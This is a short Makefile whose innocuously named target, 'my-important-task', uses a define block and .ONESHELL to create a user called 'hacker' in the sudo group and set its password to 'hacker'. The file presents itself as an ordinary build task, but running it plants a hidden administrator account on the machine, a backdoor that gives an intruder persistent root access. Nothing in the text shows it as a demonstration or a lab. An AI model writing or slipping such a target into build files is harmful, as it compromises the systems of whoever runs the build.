define my_important_task =
sudo adduser --group sudo hacker;
sudo echo "hacker" | passwd --stdin hacker;
endef

my-important-task: ; $(value my_important_task)

.ONESHELL:

